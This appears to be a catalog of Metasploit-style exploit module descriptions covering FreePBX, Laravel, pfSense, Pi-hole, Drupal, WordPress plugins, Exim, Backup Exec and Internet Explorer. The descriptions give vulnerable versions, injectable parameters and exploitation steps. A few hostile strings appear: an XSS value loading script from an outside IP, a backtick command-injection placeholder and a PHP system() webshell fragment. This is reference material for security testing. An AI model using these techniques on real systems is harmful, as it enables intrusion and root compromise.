unix/http/dell_kace_k1000_upload

unix/http/freepbx_callmenum
This module exploits FreePBX version 2.10.0,2.9.0 and possibly older. Due to the way callme_page.php handles the 'callmenum' parameter, it is possible to inject code to the '$channel' variable in function callme_startcall in order to gain remote code execution. Please note in order to use this module properly, you must know the extension number, which can be enumerated or bruteforced, or you may try some of the default extensions such as 0 or 200. Also, the call has to be answered (or go to voice). Tested on both Elastix and FreePBX ISO image installs.

unix/http/laravel_token_unserialize_exec
This module exploits a vulnerability in the PHP Laravel Framework for versions 5.5.40, 5.6.x <= 5.6.29. Remote Command Execution is possible via a correctly formatted HTTP X-XSRF-TOKEN header, due to an insecure unserialize call of the decrypt method in Illuminate/Encryption/Encrypter.php. Authentication is not required, however exploitation requires knowledge of the Laravel APP_KEY. Similar vulnerabilities appear to exist within Laravel cookie tokens based on the code fix. In some cases the APP_KEY is leaked which allows for discovery and exploitation.

unix/http/lifesize_room
This module exploits a vulnerable resource in LifeSize Room versions 3.5.3 and 4.7.18 to inject OS commands. LifeSize Room is an appliance and thus the environment is limited resulting in a small set of payload options.

unix/http/maltrail_rce
Maltrail is a malicious traffic detection system, utilizing publicly available blacklists containing malicious and/or generally suspicious trails. The Maltrail versions < 0.54 is suffering from a command injection vulnerability. The `subprocess.check_output` function in `mailtrail/core/http.py` contains a command injection vulnerability in the `params.get("username")` parameter. An attacker can exploit this vulnerability by injecting arbitrary OS commands into the username parameter. The injected commands will be executed with the privileges of the running process. This vulnerability can be exploited remotely without authentication. Successfully tested against Maltrail versions 0.52 and 0.53.

unix/http/pfsense_clickjacking
This module exploits a Clickjacking vulnerability in pfSense <= 2.4.1. pfSense is a free and open source firewall and router. It was found that the pfSense WebGUI is vulnerable to Clickjacking. By tricking an authenticated admin into interacting with a specially crafted webpage it is possible for an attacker to execute arbitrary code in the WebGUI. Since the WebGUI runs as the root user, this will result in a full compromise of the pfSense instance.

unix/http/pfsense_config_data_exec
This module exploits an authenticated command injection vulnerabilty in the "restore_rrddata()" function of pfSense prior to version 2.7.0 which allows an authenticated attacker with the "WebCfg - Diagnostics: Backup & Restore" privilege to execute arbitrary operating system commands as the "root" user. This module has been tested successfully on version 2.6.0-RELEASE.

unix/http/pfsense_diag_routes_webshell
This module exploits an arbitrary file creation vulnerability in the pfSense HTTP interface (CVE-2021-41282). The vulnerability affects versions <= 2.5.2 and can be exploited by an authenticated user if they have the "WebCfg - Diagnostics: Routing tables" privilege. This module uses the vulnerability to create a web shell and execute payloads with root privileges.

unix/http/pfsense_graph_injection_exec
pfSense, a free BSD based open source firewall distribution, version <= 2.2.6 contains a remote command execution vulnerability post authentication in the _rrd_graph_img.php page. The vulnerability occurs via the graph GET parameter. A non-administrative authenticated attacker can inject arbitrary operating system commands and execute them as the root user. Verified against 2.2.6, 2.2.5, and 2.1.3.

unix/http/pfsense_group_member_exec
pfSense, a free BSD based open source firewall distribution, version <= 2.3.1_1 contains a remote command execution vulnerability post authentication in the system_groupmanager.php page. Verified against 2.2.6 and 2.3.

unix/http/pfsense_pfblockerng_webshell
pfBlockerNG is a popular pfSense plugin that is not installed by default. It’s generally used to block inbound connections from whole countries or IP ranges. Versions 2.1.4_26 and below are affected by an unauthenticated RCE vulnerability that results in root access. Note that version 3.x is unaffected.

unix/http/pihole_blocklist_exec
This exploits a command execution in Pi-Hole <= 4.4. A new blocklist is added, and then an update is forced (gravity) to pull in the blocklist content. PHP content is then written to a file within the webroot. Phase 1 writes a sudo pihole command to launch teleporter, effectively running a priv esc. Phase 2 writes our payload to teleporter.php, overwriting, the content. Lastly, the phase 1 PHP file is called in the web root, which launches our payload in teleporter.php with root privileges.

unix/http/pihole_dhcp_mac_exec
This exploits a command execution in Pi-Hole <= 4.3.2. A new DHCP static lease is added with a MAC address which includes an RCE. Exploitation requires /opt/pihole to be first in the $PATH due to exploitation constraints. DHCP server is not required to be running.

unix/http/pihole_whitelist_exec
This exploits a command execution vulnerability in Pi-Hole <= 3.3. When adding a new domain to the whitelist, it is possible to chain a command to the domain that is run on the OS.

unix/http/quest_kace_systems_management_rce

The `download_agent_installer.php` file allows unauthenticated users to execute arbitrary commands as the web server user `www`. A valid Organization ID is required. The default value is `1`. A valid Windows agent version number must also be provided. If file sharing is enabled, the agent versions are available within the `\kace.local\client\agent_provisioning\windows_platform` Samba share. Additionally, various agent versions are listed on the KACE website. This module has been tested successfully on Quest KACE Systems Management Appliance K1000 version 8.0 (Build 8.0.318).

unix/http/raspap_rce
RaspAP is feature-rich wireless router software that just works on many popular Debian-based devices, including the Raspberry Pi. A Command Injection vulnerability in RaspAP versions 2.8.0 thru 2.8.7 allows unauthenticated attackers to execute arbitrary commands in the context of the user running RaspAP via the cfg_id parameter in /ajax/openvpn/activate_ovpncfg.php and /ajax/openvpn/del_ovpncfg.php. Successfully tested against RaspAP 2.8.0 and 2.8.7.

unix/http/schneider_electric_net55xx_encoder
This module exploits inadequate access controls within the webUI to enable the SSH service and change the root password. This module has been tested successfully on: NET5501, NET5501-I, NET5501-XT, NET5504, NET5500, NET5516, NET550 versions.

unix/http/syncovery_linux_rce_2022_36534
This module exploits an authenticated command injection vulnerability in the Web GUI of Syncovery File Sync & Backup Software for Linux. Successful exploitation results in remote code execution under the context of the root user. Syncovery allows an authenticated user to create jobs, which are executed before/after a profile is run. Jobs can contain arbitrary system commands and will be executed as root. A valid username and password or a session token is needed to exploit the vulnerability. The profile and its log file will be deleted afterwards to disguise the attack. The vulnerability is known to work on Linux platforms. All Syncovery versions prior to v9.48j are vulnerable including all versions of branch 8.

unix/http/tnftp_savefile
This module exploits an arbitrary command execution vulnerability in tnftp's handling of the resolved output filename - called "savefile" in the source - from a requested resource. If tnftp is executed without the -o command-line option, it will resolve the output filename from the last component of the requested resource. If the output filename begins with a "|" character, tnftp will pass the fetched resource's output to the command directly following the "|" character through the use of the popen() function.

unix/http/twiki_debug_plugins
TWiki 4.0.x-6.0.0 contains a vulnerability in the Debug functionality. The value of the debugenableplugins parameter is used without proper sanitization in an Perl eval statement which allows remote code execution.

unix/http/vmturbo_vmtadmin_exec_noauth
VMTurbo Operations Manager 4.6 and prior are vulnerable to unauthenticated OS Command injection in the web interface. Use reverse payloads for the most reliable results. Since it is a blind OS command injection vulnerability, there is no output for the executed command when using the cmd generic payload. Port binding payloads are disregarded due to the restrictive firewall settings. This module has been tested successfully on VMTurbo Operations Manager versions 4.5 and 4.6.

unix/http/xdebug_unauth_exec
Module exploits a vulnerability in the eval command present in Xdebug versions 2.5.5 and below. This allows the attacker to execute arbitrary php code as the context of the web user.

unix/irc/unreal_ircd_3281_backdoor
This module exploits a malicious backdoor that was added to the Unreal IRCD 3.2.8.1 download archive. This backdoor was present in the Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th 2010.

unix/local/at_persistence
This module achieves persistence by executing payloads via at(1).

unix/local/chkrootkit
Chkrootkit before 0.50 will run any executable file named /tmp/update as root, allowing a trivial privilege escalation. WfsDelay is set to 24h, since this is how often a chkrootkit scan is scheduled by default.

unix/local/emacs_movemail
This module exploits a SUID installation of the Emacs movemail utility to run a command as root by writing to 4.3BSD's /usr/lib/crontab.local. The vulnerability is documented in Cliff Stoll's book The Cuckoo's Egg.

unix/local/exim_perl_startup
This module exploits a Perl injection vulnerability in Exim < 4.86.2 given the presence of the "perl_startup" configuration parameter.

unix/local/netbsd_mail_local
This module attempts to exploit a race condition in mail.local with SUID bit set on: NetBSD 7.0 - 7.0.1 (verified on 7.0.1) NetBSD 6.1 - 6.1.5 NetBSD 6.0 - 6.0.6 Successful exploitation relies on a crontab job with root privilege, which may take up to 10min to execute.

unix/local/opensmtpd_oob_read_lpe
This module exploits an out-of-bounds read of an attacker-controlled string in OpenSMTPD's MTA implementation to execute a command as the root or nobody user, depending on the kind of grammar OpenSMTPD uses.

unix/local/setuid_nmap
Nmap's man page mentions that "Nmap should never be installed with special privileges (e.g. suid root) for security reasons.." and specifically avoids making any of its binaries setuid during installation. Nevertheless, administrators sometimes feel the need to do insecure things. This module abuses a setuid nmap binary by writing out a lua nse script containing a call to os.execute(). Note that modern interpreters will refuse to run scripts on the command line when EUID != UID, so the cmd/unix/reverse_{perl,ruby} payloads will most likely not work.

unix/misc/distcc_exec
This module uses a documented security weakness to execute arbitrary commands on any system running distccd.

unix/misc/polycom_hdx_auth_bypass
The login component of the Polycom Command Shell on Polycom HDX video endpoints, running software versions 3.0.5 and earlier, is vulnerable to an authorization bypass when simultaneous connections are made to the service, allowing remote network attackers to gain access to a sandboxed telnet prompt without authentication. Versions prior to 3.0.4 contain OS command injection in the ping command which can be used to execute arbitrary commands as root.

unix/misc/polycom_hdx_traceroute_exec
Within Polycom command shell, a command execution flaw exists in lan traceroute, one of the dev commands, which allows for an attacker to execute arbitrary payloads with telnet or openssl.

unix/misc/spamassassin_exec

unix/misc/zabbix_agent_exec
This module exploits a metacharacter injection vulnerability in the FreeBSD and Solaris versions of the Zabbix agent. This flaw can only be exploited if the attacker can hijack the IP address of an authorized server (as defined in the configuration file).

unix/smtp/clamav_milter_blackhole
This module exploits a flaw in the Clam AntiVirus suite 'clamav-milter' (Sendmail mail filter). Versions prior to v0.92.2 are vulnerable. When implemented with black hole mode enabled, it is possible to execute commands remotely due to an insecure popen call.

unix/smtp/exim4_string_format
This module exploits a heap buffer overflow within versions of Exim prior to version 4.69. By sending a specially crafted message, an attacker can corrupt the heap and execute arbitrary code with the privileges of the Exim daemon. The root cause is that no check is made to ensure that the buffer is not full prior to handling '%s' format specifiers within the 'string_vformat' function. In order to trigger this issue, we get our message rejected by sending a message that is too large. This will call into log_write to log rejection headers (which is a default configuration setting). After filling the buffer, a long header string is sent. In a successful attempt, it overwrites the ACL for the 'MAIL FROM' command. By sending a second message, the string we sent will be evaluated with 'expand_string' and arbitrary shell commands can be executed. It is likely that this issue could also be exploited using other techniques such as targeting in-band heap management structures, or perhaps even function pointers stored in the heap. However, these techniques would likely be far more platform specific, more complicated, and less reliable. This bug was original found and reported in December 2008, but was not properly handled as a security issue. Therefore, there was a 2 year lag time between when the issue was fixed and when it was discovered being exploited in the wild. At that point, the issue was assigned a CVE and began being addressed by downstream vendors. An additional vulnerability, CVE-2010-4345, was also used in the attack that led to the discovery of danger of this bug. This bug allows a local user to gain root privileges from the Exim user account. If the Perl interpreter is found on the remote system, this module will automatically exploit the secondary bug as well to get root.

unix/smtp/morris_sendmail_debug
This module exploits sendmail's well-known historical debug mode to escape to a shell and execute commands in the SMTP RCPT TO command. This vulnerability was exploited by the Morris worm in 1988-11-02. Cliff Stoll reports on the worm in the epilogue of The Cuckoo's Egg. Currently, only cmd/unix/reverse and cmd/unix/generic are supported.

unix/smtp/opensmtpd_mail_from_rce
This module exploits a command injection in the MAIL FROM field during SMTP interaction with OpenSMTPD to execute a command as the root user.

unix/smtp/qmail_bash_env_exec
This module exploits a shellshock vulnerability on Qmail, a public domain MTA written in C that runs on Unix systems. Due to the lack of validation on the MAIL FROM field, it is possible to execute shell code on a system with a vulnerable BASH (Shellshock). This flaw works on the latest Qmail versions (qmail-1.03 and netqmail-1.06). However, in order to execute code, /bin/sh has to be linked to bash (usually default configuration) and a valid recipient must be set on the RCPT TO field (usually admin@exampledomain.com). The exploit does not work on the "qmailrocks" community version as it ensures the MAILFROM field is well-formed.

unix/sonicwall/sonicwall_xmlrpc_rce
This module exploits a vulnerability in SonicWall Global Management System Virtual Appliance versions 8.1 (Build 8110.1197) and below. This virtual appliance can be downloaded from http://www.sonicwall.com/products/sonicwall-gms/ and is used 'in a holistic way to manage your entire network security environment.' These vulnerable versions (8.1 Build 8110.1197 and below) do not prevent unauthenticated, external entities from making XML-RPC requests to port 21009 of the virtual app. After the XML-RPC call is made, a shell script is called like so: 'timeSetup.sh --tz="`command injection here`"' --usentp="blah"'.

unix/ssh/arista_tacplus_shell
This exploit module takes advantage of a poorly configured TACACS+ config, Arista's bash shell and TACACS+ read-only account to privilage escalate. A CVSS v3 base score of 9.8 has been assigned.

unix/ssh/array_vxag_vapv_privkey_privesc
This module exploits a default hardcoded private SSH key or default hardcoded login and password in the vAPV 8.3.2.17 and vxAG 9.2.0.34 appliances made by Array Networks. After logged in as the unprivileged user, it's possible to modify the world-writable file /ca/bin/monitor.sh with attacker-supplied arbitrary code. Execution is possible by using the backend tool, running setuid, to turn the debug monitoring on. This makes it possible to trigger a payload with root privileges.

unix/ssh/tectia_passwd_changereq
This module exploits a vulnerability in Tectia SSH server for Unix-based platforms. The bug is caused by a SSH2_MSG_USERAUTH_PASSWD_CHANGEREQ request before password authentication, allowing any remote user to bypass the login routine, and then gain access as root.

unix/webapp/actualanalyzer_ant_cookie_exec
This module exploits a command execution vulnerability in ActualAnalyzer version 2.81 and prior. The 'aa.php' file allows unauthenticated users to execute arbitrary commands in the 'ant' cookie.

unix/webapp/aerohive_netconfig_lfi_log_poison_rce
This module exploits LFI and log poisoning vulnerabilities (CVE-2020-16152) in Aerohive NetConfig, version 10.0r8a build-242466 and older in order to achieve unauthenticated remote code execution as the root user. NetConfig is the Aerohive/Extreme Networks HiveOS administrative webinterface. Vulnerable versions allow for LFI because they rely on a version of PHP 5 that is vulnerable to string truncation attacks. This module leverages this issue in conjunction with log poisoning to gain RCE as root. Upon successful exploitation, the Aerohive NetConfig application may hang for as long as the spawned shell remains open. For the Linux target, the MeterpreterTryToFork option (enabled by default) will likely prevent this. If the app hangs, closing the session should render it responsive again. The module provides an automatic cleanup option to clean the log. However, this option is disabled by default because any modifications to the /tmp/messages log, even via sed, may render the target (temporarily) unexploitable. This state can last over an hour. This module has been successfully tested against Aerohive NetConfig versions 8.2r4 and 10.0r7a.

unix/webapp/ajenti_auth_username_cmd_injection
This module exploits a command injection in Ajenti == 2.1.31. By injecting a command into the username POST parameter to api/core/auth, a shell can be spawned.

unix/webapp/arkeia_upload_exec
This module exploits a vulnerability found in Western Digital Arkeia Appliance version 10.0.10 and lower. By abusing the upload.php script, a malicious user can upload arbitrary code to the ApplianceUpdate file in the temp directory without authentication. Abusing the local file inclusion in the lang cookie to parse this file results in arbitrary code execution, also without authentication. The module has been tested successfully on Arkeia 10.0.10. The issues have been fixed in version 10.1.10.

unix/webapp/awstats_configdir_exec
This module exploits an arbitrary command execution vulnerability in the AWStats CGI script. iDEFENSE has confirmed that AWStats versions 6.1 and 6.2 are vulnerable.

unix/webapp/basilic_diff_exec
This module abuses a metacharacter injection vulnerability in the diff.php script. This flaw allows an unauthenticated attacker to execute arbitrary commands as the www-data user account.

unix/webapp/bolt_authenticated_rce
This module exploits multiple vulnerabilities in Bolt CMS version 3.7.0 and 3.6.* in order to execute arbitrary commands as the user running Bolt. This module first takes advantage of a vulnerability that allows an authenticated user to change the username in /bolt/profile to a PHP `system($_GET[""])` variable. Next, the module obtains a list of tokens from `/async/browse/cache/.sessions` and uses these to create files with the blacklisted `.php` extention via HTTP POST requests to `/async/folder/rename`. For each created file, the module checks the HTTP response for evidence that the file can be used to execute arbitrary commands via the created PHP $_GET variable. If the response is negative, the file is deleted, otherwise the payload is executed via an HTTP get request in this format: `/files/<rogue_PHP_file>?<$_GET_var>=<payload>` Valid credentials for a Bolt CMS user are required. This module has been successfully tested against Bolt CMS 3.7.0 running on CentOS 7.

unix/webapp/cacti_graphimage_exec
This module exploits an arbitrary command execution vulnerability in the Raxnet Cacti 'graph_view.php' script. All versions of Raxnet Cacti prior to 0.8.6-d are vulnerable.

unix/webapp/cakephp_cache_corruption
CakePHP is a popular PHP framework for building web applications. The Security component of CakePHP versions 1.3.5 and earlier and 1.2.8 and earlier is vulnerable to an unserialize attack which could be abused to allow unauthenticated attackers to execute arbitrary code with the permissions of the webserver.

unix/webapp/carberp_backdoor_exec
This module exploits backdoors that can be found all over the leaked source code of the Carberp botnet C2 Web Panel.

unix/webapp/citrix_access_gateway_exec
The Citrix Access Gateway provides support for multiple authentication types. When utilizing the external legacy NTLM authentication module known as ntlm_authenticator the Access Gateway spawns the Samba 'samedit' command line utility to verify a user's identity and password. By embedding shell metacharacters in the web authentication form it is possible to execute arbitrary commands on the Access Gateway.

unix/webapp/clipbucket_upload_exec
This module exploits a vulnerability found in ClipBucket version 2.6 and lower. The script "/admin_area/charts/ofc-library/ofc_upload_image.php" can be used to upload arbitrary code without any authentication. This module has been tested on version 2.6 on CentOS 5.9 32-bit.

unix/webapp/coppermine_piceditor
This module exploits a vulnerability in the picEditor.php script of Coppermine Photo Gallery versions 1.4.14 and earlier. When configured to use the ImageMagick library, the 'quality', 'angle', and 'clipval' parameters are not properly escaped before being passed to the PHP 'exec' command. In order to reach the vulnerable 'exec' call, the input must pass several validation steps. The vulnerabilities actually reside in the following functions: image_processor.php: rotate_image(...) include/imageObjectIM.class.php: imageObject::cropImage(...) include/imageObjectIM.class.php: imageObject::rotateImage(...) include/imageObjectIM.class.php: imageObject::resizeImage(...) include/picmgmt.inc.php: resize_image(...) NOTE: Use of the ImageMagick library is a non-default option. However, a user can specify its use at installation time.

unix/webapp/datalife_preview_exec
This module exploits a PHP code injection vulnerability DataLife Engine 9.7. The vulnerability exists in preview.php, due to an insecure usage of preg_replace() with the e modifier, which allows to inject arbitrary php code, when there is a template installed which contains a [catlist] or [not-catlist] tag, even when the template isn't in use currently. The template can be configured with the TEMPLATE datastore option.

unix/webapp/dogfood_spell_exec
This module exploits a previously unpublished vulnerability in the Dogfood CRM mail function which is vulnerable to command injection in the spell check feature. Because of character restrictions, this exploit works best with the double-reverse telnet payload. This vulnerability was discovered by LSO and affects v2.0.10.

unix/webapp/drupal_coder_exec
This module exploits a Remote Command Execution vulnerability in the Drupal CODER Module. Unauthenticated users can execute arbitrary commands under the context of the web server user. The CODER module doesn't sufficiently validate user inputs in a script file that has the PHP extension. A malicious unauthenticated user can make requests directly to this file to execute arbitrary commands. The module does not need to be enabled for this to be exploited. This module was tested against CODER 2.5 with Drupal 7.5 installed on Ubuntu Server.

unix/webapp/drupal_drupalgeddon2
This module exploits a Drupal property injection in the Forms API. Drupal 6.x, < 7.58, 8.2.x, < 8.3.9, < 8.4.6, and < 8.5.1 are vulnerable.

unix/webapp/drupal_restws_exec
This module exploits a Remote PHP Code Execution vulnerability in the Drupal RESTWS Module. Unauthenticated users can execute arbitrary code under the context of the web server user. RESTWS alters the default page callbacks for entities to provide additional functionality. A vulnerability in this approach allows an unauthenticated attacker to send specially crafted requests resulting in arbitrary PHP execution. RESTWS 2.x prior to 2.6 and 1.x prior to 1.7 are affected by this issue. This module was tested against RESTWS 2.5 with Drupal 7.5 installed on Ubuntu Server.

unix/webapp/drupal_restws_unserialize
This module exploits a PHP unserialize() vulnerability in Drupal RESTful Web Services by sending a crafted request to the /node REST endpoint. As per SA-CORE-2019-003, the initial remediation was to disable POST, PATCH, and PUT, but Ambionics discovered that GET was also vulnerable (albeit cached). Cached nodes can be exploited only once. Drupal updated SA-CORE-2019-003 with PSA-2019-02-22 to notify users of this alternate vector. Drupal < 8.5.11 and < 8.6.10 are vulnerable.

unix/webapp/egallery_upload_exec
This module exploits a vulnerability found in EGallery 1.2 By abusing the uploadify.php file, a malicious user can upload a file to the egallery/ directory without any authentication, which results in arbitrary code execution. The module has been tested successfully on Ubuntu 10.04.

unix/webapp/elfinder_php_connector_exiftran_cmd_injection
This module exploits a command injection vulnerability in elFinder versions prior to 2.1.48. The PHP connector component allows unauthenticated users to upload files and perform file modification operations, such as resizing and rotation of an image. The file name of uploaded files is not validated, allowing shell metacharacters. When performing image operations on JPEG files, the filename is passed to the `exiftran` utility without appropriate sanitization, causing shell commands in the file name to be executed, resulting in remote command injection as the web server user. The PHP connector is not enabled by default. The system must have `exiftran` installed and in `$PATH`. This module has been tested successfully on elFinder versions 2.1.47, 2.1.20 and 2.1.16 on Ubuntu.

unix/webapp/flashchat_upload_exec
This module exploits a file upload vulnerability found in FlashChat versions 6.0.2 and 6.0.4 to 6.0.8. Attackers can abuse the upload feature in order to upload malicious PHP files without authentication which results in arbitrary remote code execution as the web server user.

unix/webapp/foswiki_maketext
This module exploits a vulnerability in the MAKETEXT Foswiki variable. By using a specially crafted MAKETEXT, a malicious user can execute shell commands since the input is passed to the Perl "eval" command without first being sanitized. The problem is caused by an underlying security issue in the CPAN:Locale::Maketext module. Only Foswiki sites that have user interface localization enabled (UserInterfaceInternationalisation variable set) are vulnerable. If USERNAME and PASSWORD aren't provided, anonymous access will be tried. Also, if the FoswikiPage option isn't provided, the module will try to create a random page on the SandBox space. The modules has been tested successfully on Foswiki 1.1.5 as distributed with the official Foswiki-1.1.5-vmware image.

unix/webapp/freepbx_config_exec

unix/webapp/wp_symposium_shell_upload
WP Symposium Plugin for WordPress contains a flaw that allows a remote attacker to execute arbitrary PHP code. This flaw exists because the /wp-symposium/server/file_upload_form.php script does not properly verify or sanitize user-uploaded files. By uploading a .php file, the remote system will place the file in a user-accessible path. Making a direct request to the uploaded file will allow the attacker to execute the script with the privileges of the web server.

unix/webapp/wp_total_cache_exec
This module exploits a PHP Code Injection vulnerability against WordPress plugin W3 Total Cache for versions up to and including 0.9.2.8. WP Super Cache 1.2 or older is also reported as vulnerable. The vulnerability is due to the handling of certain macros such as mfunc, which allows arbitrary PHP code injection. A valid post ID is needed in order to add the malicious comment. If the POSTID option isn't specified, then the module will automatically find or bruteforce one. Also, if anonymous comments aren't allowed, then a valid username and password must be provided. In addition, the "A comment is held for moderation" option on WordPress must be unchecked for successful exploitation. This module has been tested against WordPress 3.5 and W3 Total Cache 0.9.2.3 on a Ubuntu 10.04 system.

unix/webapp/wp_wptouch_file_upload
The WordPress WPTouch plugin contains an authenticated file upload vulnerability. A wp-nonce (CSRF token) is created on the backend index page and the same token is used on handling ajax file uploads through the plugin. By sending the captured nonce with the upload, we can upload arbitrary files to the upload folder. Because the plugin also uses its own file upload mechanism instead of the WordPress api it's possible to upload any file type. The user provided does not need special rights, and users with "Contributor" role can be abused.

unix/webapp/wp_wysija_newsletters_upload
The Wordpress plugin "MailPoet Newsletters" (wysija-newsletters) before 2.6.8 is vulnerable to an unauthenticated file upload. The exploit uses the Upload Theme functionality to upload a zip file containing the payload. The plugin uses the admin_init hook, which is also executed for unauthenticated users when accessing a specific URL. The first fix for this vulnerability appeared in version 2.6.7, but the fix can be bypassed. In PHP's default configuration, a POST variable overwrites a GET variable in the $_REQUEST array. The plugin uses $_REQUEST to check for access rights. By setting the POST parameter to something not beginning with 'wysija_', the check is bypassed. Wordpress uses the $_GET array to determine the page, so it is not affected by this. The developers applied the fixes to all previous versions too.

unix/webapp/xoda_file_upload

windows/backupexec/name_service
This module exploits a vulnerability in the Veritas Backup Exec Agent Browser service. This vulnerability occurs when a recv() call has a length value too long for the destination stack buffer. By sending an agent name value of 63 bytes or more, we can overwrite the return address of the recv function. Since we only have ~60 bytes of contiguous space for shellcode, a tiny findsock payload is sent which uses a hardcoded IAT address for the recv() function. This payload will then roll the stack back to the beginning of the page, recv() the real shellcode into it, and jump to it. This module has been tested against Veritas 9.1 SP0, 9.1 SP1, and 8.6.

windows/backupexec/remote_agent
This module exploits a stack buffer overflow in the Veritas BackupExec Windows Agent software. This vulnerability occurs when a client authentication request is received with type '3' and a long password argument.

windows/backupexec/ssl_uaf
This module exploits a use-after-free vulnerability in the handling of SSL NDMP connections in Veritas/Symantec Backup Exec's Remote Agent for Windows. When SSL is re-established on a NDMP connection that previously has had SSL established, the BIO struct for the connection's previous SSL session is reused, even though it has previously been freed. This module supports 3 specific versions of the Backup Exec agent in the 14, 15 and 16 series on 64-bit and 32-bit versions of Windows and has been tested from Vista to Windows 10. The check command can help narrow down what major and minor revision is installed and the precise of version of Windows, but some other information may be required to make a reliable choice of target. NX, ASLR and Windows 8+ anti-ROP mitigations are bypassed. On Windows 8+, it has a reliability of around 85%. On other versions of Windows, reliability is around 35% (due to the need to win a race condition across the network in this case; this may drop further depending on network conditions). The agent is normally installed on all hosts in a domain that need to be backed up, so if one service crashes, try again on another :) Successful exploitation will give remote code execution as the user of the Backup Exec Remote Agent for Windows service, almost always NT AUTHORITY\SYSTEM.

windows/browser/adobe_flashplayer_arrayindexing
This module exploits a vulnerability in Adobe Flash Player versions 10.3.181.23 and earlier. This issue is caused by a failure in the ActionScript3 AVM2 verification logic. This results in unsafe JIT(Just-In-Time) code being executed. This is the same vulnerability that was used for attacks against Korean based organizations. Specifically, this issue occurs when indexing an array using an arbitrary value, memory can be referenced and later executed. Taking advantage of this issue does not rely on heap spraying as the vulnerability can also be used for information leakage. Currently this exploit works for IE6, IE7, IE8, Firefox 10.2 and likely several other browsers under multiple Windows platforms. This exploit bypasses ASLR/DEP and is very reliable.

windows/browser/adobe_flashplayer_avm
This module exploits a vulnerability in Adobe Flash Player versions 10.2.152.33 and earlier. This issue is caused by a failure in the ActionScript3 AVM2 verification logic. This results in unsafe JIT(Just-In-Time) code being executed. This is the same vulnerability that was used for the RSA attack in March 2011. Specifically, this issue results in uninitialized memory being referenced and later executed. Taking advantage of this issue relies on heap spraying and controlling the uninitialized memory. Currently this exploit works for IE6, IE7, and Firefox 3.6 and likely several other browsers. DEP does catch the exploit and causes it to fail. Due to the nature of the uninitialized memory its fairly difficult to get around this restriction.

windows/browser/adobe_flashplayer_flash10o
This module exploits a vulnerability in Adobe Flash Player that was discovered, and has been exploited actively in the wild.

This is due to the QuickTime3GPP.gtx component not handling certain Style subfields properly, as the font-table field, which is used to trigger the overflow in this module. Because of QuickTime restrictions when handling font-table fields, only 0x31-0x39 bytes can be used to overflow, so at the moment DEP/ASLR bypass hasn't been provided. The module has been tested successfully on IE6 and IE7 browsers (Windows XP and Vista).

windows/browser/aventail_epi_activex
This module exploits a format string vulnerability within version 10.0.4.x and 10.5.1 of the SonicWALL Aventail SSL-VPN Endpoint Interrogator/Installer ActiveX control (epi.dll). By calling the 'AuthCredential' method with a specially crafted Unicode format string, an attacker can cause memory corruption and execute arbitrary code. Unfortunately, it does not appear to be possible to indirectly re-use existing stack data for more reliable exploitation. This is due to several particulars about this vulnerability. First, the format string must be a Unicode string, which uses two bytes per character. Second, the buffer is allocated on the stack using the 'alloca' function. As such, each additional format specifier (%x) will add four more bytes to the size allocated. This results in the inability to move the read pointer outside of the buffer. Further testing showed that using specifiers that pop more than four bytes does not help. Any number of format specifiers will result in accessing the same value within the buffer. NOTE: It may be possible to leverage the vulnerability to leak memory contents. However, that has not been fully investigated at this time.

windows/browser/ie_setmousecapture_uaf
This module exploits a use-after-free vulnerability that currents targets Internet Explorer 9 on Windows 7, but the flaw should exist in versions 6/7/8/9/10/11. It was initially found in the wild in Japan, but other regions such as English, Chinese, Korean, etc, were targeted as well. The vulnerability is due to how the mshtml!CDoc::SetMouseCapture function handles a reference during an event. An attacker first can setup two elements, where the second is the child of the first, and then setup a onlosecapture event handler for the parent element. The onlosecapture event seems to require two setCapture() calls to trigger, one for the parent element, one for the child. When the setCapture() call for the child element is called, it finally triggers the event, which allows the attacker to cause an arbitrary memory release using document.write(), which in particular frees up a 0x54-byte memory. The exact size of this memory may differ based on the version of IE. After the free, an invalid reference will still be kept and pass on to more functions, eventuall this arrives in function MSHTML!CTreeNode::GetInterface, and causes a crash (or arbitrary code execution) when this function attempts to use this reference to call what appears to be a PrivateQueryInterface due to the offset (0x00). To mimic the same exploit found in the wild, this module will try to use the same DLL from Microsoft Office 2007 or 2010 to leverage the attack.

windows/browser/ie_unsafe_scripting
This exploit takes advantage of the "Initialize and script ActiveX controls not marked safe for scripting" setting within Internet Explorer. When this option is set, IE allows access to the WScript.Shell ActiveX control, which allows javascript to interact with the file system and run commands. This security flaw is not uncommon in corporate environments for the 'Intranet' or 'Trusted Site' zones. When set via domain policy, the most common registry entry to modify is HKLM\ Software\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201, which if set to '0' forces ActiveX controls not marked safe for scripting to be enabled for the Intranet zone. This module creates a javascript/html hybrid that will render correctly either via a direct GET http://msf-server/ or as a javascript include, such as in: http://intranet-server/xss.asp?id="><script%20src=http://10.10.10.10/ie_unsafe_script.js> </script>. IE Tabs, WScript and subsequent Powershell prompts all run as x86 even when run from an x64 iexplore.exe. By default, this module will not attempt to fire against IEs that come with Protected Mode enabled by default, because it can trigger a security prompt. However, if you are feeling brave, you can choose to ignore this restriction by setting the ALLOWPROMPT datastore option to true.

windows/browser/imgeviewer_tifmergemultifiles
This module exploits a stack based buffer overflow in the Active control file ImageViewer2.OCX by passing an overly long argument to an insecure TifMergeMultiFiles() method. Exploitation results in code execution with the privileges of the user who browsed to the exploit page. The victim will first be required to trust the publisher Viscom Software. This module has been designed to bypass DEP and ASLR under XP IE8, Vista and Win7 with Java support.

windows/browser/indusoft_issymbol_internationalseparator
This module exploits a heap overflow found in InduSoft Web Studio <= 61.6.00.00 SP6. The overflow exists in the ISSymbol.ocx, and can be triggered with a long string argument for the InternationalSeparator() method of the ISSymbol control. This module uses the msvcr71.dll form the Java JRE6 to bypass ASLR.

windows/browser/inotes_dwa85w_bof
This module exploits a buffer overflow vulnerability on the UploadControl ActiveX. The vulnerability exists in the handling of the "Attachment_Times" property, due to the insecure usage of the _swscanf. The affected ActiveX is provided by the dwa85W.dll installed with the IBM Lotus iNotes ActiveX installer. This module has been tested successfully on IE6-IE9 on Windows XP, Vista and 7, using the dwa85W.dll 85.3.3.0 as installed with Lotus Domino 8.5.3. In order to bypass ASLR the no aslr compatible module dwabho.dll is used. This one is installed with the iNotes ActiveX.

windows/browser/intrust_annotatex_add
This module exploits an uninitialized variable vulnerability in the Annotation Objects ActiveX component. The ActiveX component loads into memory without opting into ALSR so this module exploits the vulnerability against windows Vista and Windows 7 targets. A large heap spray is required to fulfill the requirement that EAX points to part of the ROP chain in a heap chunk and the calculated call will hit the pivot in a separate heap chunk. This will take some time in the users browser.

windows/browser/java_basicservice_impl
